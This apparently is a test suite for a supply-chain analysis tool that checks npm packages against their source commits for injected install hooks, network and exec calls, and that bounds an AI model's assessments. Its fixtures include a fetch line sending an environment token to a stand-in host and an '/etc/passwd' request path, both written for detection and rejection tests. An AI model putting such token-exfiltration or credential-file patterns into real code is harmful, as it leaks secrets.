import { describe, it, expect, vi } from "vitest";
import { analyze, createOllamaClient, validateEvidence } from "./index.js";
import {
  AnalysisRequestSchema,
  AnalysisReportSchema,
  type ModelClient,
  type ArtifactSnapshot,
  type SourceSnapshot,
} from "@vajra/contracts";
import {
  fixture,
  dependencies,
  adapters,
  memorySnapshot,
  request,
  COMMIT,
  REPOSITORY,
  fixtureModel,
  hash,
} from "./testing.js";
import { signals } from "./rules.js";

const run = (deps = dependencies()) => analyze(request, deps);
describe("contracts and source identity", () => {
  it.each(["../escape", "/absolute", "a/../../b", "a\\b"])(
    "rejects unsafe source roots %s",
    (packageRoot) => {
      expect(
        AnalysisRequestSchema.safeParse({
          ...request,
          source: { ...request.source, packageRoot },
        }).success,
      ).toBe(false);
    },
  );
  it("rejects mutable source refs and latest package version", () => {
    expect(
      AnalysisRequestSchema.safeParse({
        ...request,
        source: { kind: "github", repositoryUrl: REPOSITORY, commit: "main" },
      }).success,
    ).toBe(false);
    expect(
      AnalysisRequestSchema.safeParse({
        ...request,
        artifact: { kind: "npm", name: "demo-package", version: "latest" },
      }).success,
    ).toBe(false);
  });
  it("resolves an exact commit and records evidence", async () => {
    const r = await run();
    expect(r.source.commit).toBe(COMMIT);
    expect(r.source.method).toBe("user_commit");
    expect(r.source.packageRoot).toBe("");
  });
  it("does not substitute a different commit", async () => {
    const f = fixture();
    const d = dependencies();
    d.ingestion = adapters(f.artifact, { ...f.source, commit: "b".repeat(40) });
    const r = await run(d);
    expect(r.status).toBe("partial");
    expect(r.source.method).toBe("unresolved");
    expect(r.findings.every((f) => f.classification === "unresolved")).toBe(
      true,
    );
  });
  it("rejects artifact identity mismatch", async () => {
    const d = dependencies();
    await expect(
      analyze(
        {
          ...request,
          artifact: { kind: "npm", name: "other", version: "1.0.0" },
        },
        d,
      ),
    ).rejects.toMatchObject({ code: "ARTIFACT_IDENTITY_MISMATCH" });
  });
  it("does not trust an arbitrary repository host", () => {
    expect(
      AnalysisRequestSchema.safeParse({
        ...request,
        source: {
          kind: "github",
          repositoryUrl: "http://127.0.0.1/repo",
          commit: COMMIT,
        },
      }).success,
    ).toBe(false);
  });
  it("resolves monorepo roots by package name", async () => {
    const f = fixture(false);
    const source = {
      ...memorySnapshot({
        "packages/demo/package.json": JSON.stringify({
          name: "demo-package",
          version: "1.0.0",
        }),
        "packages/demo/index.js": "export const answer = 42;\n",
        "packages/other/package.json": JSON.stringify({
          name: "other",
          version: "1.0.0",
        }),
      }),
      commit: COMMIT,
      repositoryUrl: REPOSITORY,
    };
    const d = dependencies(false);
    d.ingestion = adapters(f.artifact, source);
    const r = await run(d);
    expect(r.source.packageRoot).toBe("packages/demo");
    expect(
      r.files.every((f) => !f.sourcePath?.startsWith("packages/other")),
    ).toBe(true);
  });
  it("refuses ambiguous roots", async () => {
    const f = fixture();
    const s = {
      ...memorySnapshot({
        "a/package.json": '{"name":"demo-package"}',
        "b/package.json": '{"name":"demo-package"}',
      }),
      commit: COMMIT,
    };
    const d = dependencies();
    d.ingestion = adapters(f.artifact, s);
    expect((await run(d)).source.method).toBe("unresolved");
  });
  it("does not pick between conflicting release tags", async () => {
    const f = fixture();
    delete f.artifact.metadata.gitHead;
    const d = dependencies();
    d.ingestion = adapters(f.artifact, f.source);
    d.ingestion.resolveGithubRef = async ({ ref }) =>
      ref === "v1.0.0" ? COMMIT : "b".repeat(40);
    const r = await analyze({ ...request, source: { kind: "auto" } }, d);
    expect(r.source.method).toBe("unresolved");
    expect(r.source.limitations.join(" ")).toContain("disagree");
  });
  it("marks tag identity tentative even if tags converge", async () => {
    const f = fixture();
    delete f.artifact.metadata.gitHead;
    const d = dependencies();
    d.ingestion = adapters(f.artifact, f.source);
    const r = await analyze({ ...request, source: { kind: "auto" } }, d);
    expect(r.source.method).toBe("release_tag_candidate");
    expect(r.status).toBe("partial");
  });
  it("records publisher gitHead without claiming attestation", async () => {
    const r = await analyze(
      { ...request, source: { kind: "auto" } },
      dependencies(),
    );
    expect(r.source.method).toBe("release_git_head");
    expect(r.source.limitations.join(" ")).toContain("not a verified");
  });
});
describe("comparison and findings", () => {
  it("catches lifecycle and network plus execution injection with exact evidence", async () => {
    const d = dependencies();
    const r = await run(d);
    expect(r.findings.map((f) => f.ruleId)).toEqual(
      expect.arrayContaining([
        "lifecycle_change",
        "published_executable",
        "introduced_network",
        "introduced_execute",
        "introduced_sensitive",
      ]),
    );
    for (const f of r.findings)
      for (const e of f.evidence)
        expect(() => validateEvidence(e, d.details)).not.toThrow();
    expect(r.findings.some((f) => f.severity === "high")).toBe(true);
    expect(AnalysisReportSchema.safeParse(r).success).toBe(true);
  });
  it("explains omitted tests through package files declaration", async () => {
    const r = await run(dependencies(false));
    expect(r.findings.some((f) => f.ruleId === "packaging_files")).toBe(true);
    expect(
      r.findings.some((f) => f.classification === "suspicious_change"),
    ).toBe(false);
  });
  it("does not misclassify comments or strings as execution", () => {
    expect(
      signals('// exec("x")\nconst s = "fetch(hello)";', "file.js"),
    ).toEqual([]);
  });
  it("handles imported aliases", () => {
    expect(
      signals(
        'import { exec as run } from "node:child_process"; run("echo x");',
        "file.js",
      ).map((s) => s.kind),
    ).toContain("execute");
  });
  it.each([
    'const https = require("node:https"); https.request("example.invalid");',
    'import * as http from "node:http"; http.get("example.invalid");',
    'import { request as send } from "https"; send("example.invalid");',
  ])("detects network calls through Node module bindings: %s", (code) => {
    expect(signals(code, "file.js").map((s) => s.kind)).toContain("network");
  });
  it("does not flag an unchanged preexisting sensitive call", async () => {
    const f = fixture(false);
    const code =
      'fetch("https://example.invalid", {body: process.env.TOKEN});\n';
    const p = {
      "package.json": '{"name":"demo-package","version":"1.0.0"}',
      "index.js": code,
    };
    const d = dependencies();
    d.ingestion = adapters(
      { ...memorySnapshot(p), metadata: f.artifact.metadata, root: "" },
      { ...memorySnapshot(p), commit: COMMIT },
    );
    const r = await run(d);
    expect(r.findings).toHaveLength(0);
  });
  it("identifies relocated exact bytes without calling them new execution", async () => {
    const f = fixture(false);
    const p = {
      "package.json": '{"name":"demo-package","version":"1.0.0"}',
      "lib/index.js": "export const answer = 42;\n",
    };
    const d = dependencies();
    d.ingestion = adapters(
      { ...memorySnapshot(p), metadata: f.artifact.metadata, root: "" },
      f.source,
    );
    const r = await run(d);
    expect(r.findings.some((f) => f.ruleId === "relocated_exact")).toBe(true);
    expect(r.findings.some((f) => f.ruleId === "published_executable")).toBe(
      false,
    );
  });
  it("does not treat build paths as proof of equivalence", async () => {
    const p = {
      "package.json":
        '{"name":"demo-package","version":"1.0.0","scripts":{"build":"tsc"}}',
      "dist/index.js": "export const a=1;",
    };
    const d = dependencies();
    d.ingestion = adapters(
      {
        ...memorySnapshot(p),
        metadata: { name: "demo-package", version: "1.0.0" },
        root: "",
      },
      {
        ...memorySnapshot({ "package.json": p["package.json"] }),
        commit: COMMIT,
      },
    );
    const r = await run(d);
    expect(
      r.findings.some((f) => f.classification === "generated_unverified"),
    ).toBe(true);
    expect(r.findings.some((f) => f.ruleId === "published_executable")).toBe(
      true,
    );
  });
  it("marks changed binary files skipped rather than safe", async () => {
    const f = fixture(false);
    const p = {
      "package.json": '{"name":"demo-package","version":"1.0.0"}',
      "binary.bin": new Uint8Array([0, 1]),
    };
    const d = dependencies();
    d.ingestion = adapters(
      { ...memorySnapshot(p), metadata: f.artifact.metadata, root: "" },
      f.source,
    );
    const r = await run(d);
    expect(r.coverage.skippedFiles).toBe(1);
    expect(r.status).toBe("partial");
  });
  it("validates raw content hashes supplied by adapters", async () => {
    const f = fixture();
    f.artifact.entries[0]!.sha256 = "0".repeat(64);
    const d = dependencies();
    d.ingestion = adapters(f.artifact, f.source);
    await expect(run(d)).rejects.toMatchObject({ code: "INVALID_SNAPSHOT" });
  });
  it("rejects duplicate snapshot paths", async () => {
    const f = fixture();
    const d = dependencies();
    d.ingestion = adapters(
      {
        ...f.artifact,
        entries: [...f.artifact.entries, f.artifact.entries[0]!],
      },
      f.source,
    );
    await expect(run(d)).rejects.toMatchObject({ code: "INVALID_SNAPSHOT" });
  });
  it("flags unreadable/truncated coverage", async () => {
    const d = dependencies();
    d.limits = { maxTextBytes: 180 };
    const r = await run(d);
    expect(r.status).toBe("partial");
  });
});
describe("model containment and pipeline", () => {
  it("retains deterministic findings without an AI model", async () => {
    const d = dependencies();
    delete d.model;
    const r = await run(d);
    expect(r.status).toBe("partial");
    expect(r.model.status).toBe("not_configured");
    expect(r.findings.length).toBeGreaterThan(0);
  });
  it("rejects invented model evidence", async () => {
    const d = dependencies();
    d.model = {
      id: "bad-test-model",
      async complete({ prompt }) {
        const p = JSON.parse(prompt);
        return {
          assessments: [
            {
              findingId: p.findings[0].id,
              interpretation: "needs_review",
              explanation: "Test",
              uncertainty: "Test",
              evidenceIds: ["invented"],
            },
          ],
        };
      },
    };
    const r = await run(d);
    expect(r.model.status).toBe("failed");
    expect(r.findings.every((f) => f.origin === "rule")).toBe(true);
  });
  it("accepts only evidence IDs belonging to the assessed finding", async () => {
    const d = dependencies();
    let prompt = "";
    d.model = {
      id: "evidence-selection-test",
      async complete(input) {
        prompt = input.prompt;
        const p = JSON.parse(input.prompt);
        return {
          assessments: p.findings.map(
            (f: { id: string; evidence: { id: string }[] }) => ({
              findingId: f.id,
              interpretation: "needs_review",
              explanation: "The supplied evidence supports further review.",
              evidenceIds: [f.evidence[0]!.id],
              uncertainty: "Context is limited to the supplied excerpts.",
            }),
          ),
        };
      },
    };
    const r = await run(d);
    expect(r.model.status).toBe("used");
    expect(r.findings.some((f) => f.origin === "combined")).toBe(true);
    const input = JSON.parse(prompt);
    for (const f of input.findings) {
      expect(f.evidence.length).toBeGreaterThan(0);
      expect(f.evidence.every((e: { id: string }) => e.id.length > 0)).toBe(
        true,
      );
    }
  });
  it("rejects wrong excerpts and out-of-range lines", async () => {
    const d = dependencies();
    await run(d);
    const f = d.details.find((d) => d.file.packagePath === "install.js")!;
    expect(() =>
      validateEvidence(
        {
          fileId: f.file.id,
          side: "package",
          startLine: 1,
          endLine: 1,
          excerpt: "invented",
        },
        d.details,
      ),
    ).toThrow();
    expect(() =>
      validateEvidence(
        { fileId: f.file.id, side: "package", startLine: 999, endLine: 1000 },
        d.details,
      ),
    ).toThrow();
  });
  it("enforces timeout even for an adapter ignoring cancellation", async () => {
    const d = dependencies();
    d.modelTimeoutMs = 10;
    d.model = { id: "hung", complete: () => new Promise(() => {}) };
    const r = await run(d);
    expect(r.model.status).toBe("failed");
    expect(r.model.reason).toContain("timed out");
  });
  it("propagates caller cancellation", async () => {
    const d = dependencies();
    const c = new AbortController();
    d.signal = c.signal;
    c.abort();
    await expect(run(d)).rejects.toThrow();
  });
  it("emits ordered progress and persists files only after validation", async () => {
    const d = dependencies();
    const stages: string[] = [];
    const r = await analyze(request, d, (s) => {
      stages.push(s);
    });
    expect(stages).toEqual([
      "retrieving",
      "resolving",
      "comparing",
      "assessing",
      "done",
    ]);
    expect(d.details.length).toBe(r.files.length);
  });
  it("does not hide persistence errors", async () => {
    const d = dependencies();
    d.saveFileDetail = async () => {
      throw new Error("database unavailable");
    };
    await expect(run(d)).rejects.toThrow("database unavailable");
  });
  it("reports unreviewed AI context rather than implying complete review", async () => {
    const d = dependencies();
    d.limits = { maxModelFiles: 1 };
    const r = await run(d);
    expect(r.status).toBe("partial");
    expect(r.coverage.reasons.join(" ")).toContain("context limits");
  });
  it("does not permit unknown request properties", () => {
    expect(
      AnalysisRequestSchema.safeParse({ ...request, path: "/etc/passwd" })
        .success,
    ).toBe(false);
  });
  it("rejects malformed model JSON", async () => {
    const d = dependencies();
    d.model = {
      id: "bad",
      async complete() {
        return { arbitrary: "shape" };
      },
    };
    expect((await run(d)).model.status).toBe("failed");
  });
  it("makes a bounded Ollama structured-output request", async () => {
    const fetcher = vi.fn(
      async () =>
        new Response(
          JSON.stringify({ message: { content: '{"assessments":[]}' } }),
          { status: 200 },
        ),
    );
    const client = createOllamaClient({
      model: "gemma4:e4b",
      fetch: fetcher as typeof fetch,
    });
    expect(
      await client.complete({
        system: "test",
        prompt: "test",
        signal: new AbortController().signal,
      }),
    ).toEqual({ assessments: [] });
    const init = fetcher.mock.calls[0] as unknown as [URL, RequestInit];
    expect(JSON.parse(init[1].body as string).stream).toBe(false);
  });
  it("rejects oversized Ollama response", async () => {
    const client = createOllamaClient({
      model: "test",
      maxOutputBytes: 10,
      fetch: (async () => new Response("x".repeat(20))) as typeof fetch,
    });
    await expect(
      client.complete({
        system: "",
        prompt: "",
        signal: new AbortController().signal,
      }),
    ).rejects.toMatchObject({ code: "MODEL_OUTPUT_LIMIT" });
  });
});

describe("declared generated entry points", () => {
  it.each([false, true])(
    "keeps generated equivalence uncertain and checks introduced behavior %s",
    async (injected) => {
      const manifest = JSON.stringify({
        name: "demo-package",
        version: "1.0.0",
        main: "index.js",
        scripts: { build: "node scripts/build.js" },
      });
      const artifact: ArtifactSnapshot = {
        ...memorySnapshot({
          "package.json": manifest,
          "index.js": injected
            ? 'fetch("https://example.invalid");'
            : "exports.answer=42;",
        }),
        root: "",
        metadata: { name: "demo-package", version: "1.0.0" },
      };
      const source: SourceSnapshot = {
        ...memorySnapshot({
          "package.json": manifest,
          "src/index.mjs": "export const answer=42;",
        }),
        commit: COMMIT,
      };
      const d = dependencies();
      d.ingestion = adapters(artifact, source);
      const r = await run(d);
      expect(
        r.findings.some(
          (f) =>
            f.ruleId === "declared_build_output" &&
            f.classification === "generated_unverified",
        ),
      ).toBe(true);
      expect(r.findings.some((f) => f.ruleId === "published_executable")).toBe(
        false,
      );
      expect(r.findings.some((f) => f.ruleId === "introduced_network")).toBe(
        injected,
      );
    },
  );
});

describe("source URL and duplicate signal regressions", () => {
  it("accepts npm GitHub shorthand and equivalent repository URL spellings", async () => {
    const f = fixture();
    f.artifact.metadata.repository = { url: "example/demo-package" };
    f.source.repositoryUrl = REPOSITORY + ".git/";
    const d = dependencies();
    d.ingestion = adapters(f.artifact, f.source);
    const r = await analyze({ ...request, source: { kind: "auto" } }, d);
    expect(r.source.method).toBe("release_git_head");
  });
  it("deduplicates repeated calls on the same evidence line", async () => {
    const f = fixture(false);
    const pkg = {
      "package.json": '{"name":"demo-package","version":"1.0.0"}',
      "index.js":
        'fetch("https://example.invalid");fetch("https://example.invalid");',
    };
    const d = dependencies();
    d.ingestion = adapters(
      { ...memorySnapshot(pkg), root: "", metadata: f.artifact.metadata },
      f.source,
    );
    const r = await run(d);
    expect(
      r.findings.filter((f) => f.ruleId === "introduced_network"),
    ).toHaveLength(1);
    expect(AnalysisReportSchema.safeParse(r).success).toBe(true);
  });
});

it("bounds finding volume and marks the omitted coverage", async () => {
  const d = dependencies();
  d.limits = { maxFindings: 2 };
  const r = await run(d);
  expect(r.findings.length).toBeLessThanOrEqual(2);
  expect(r.status).toBe("partial");
  expect(r.coverage.reasons.join(" ")).toContain("Finding limit");
});
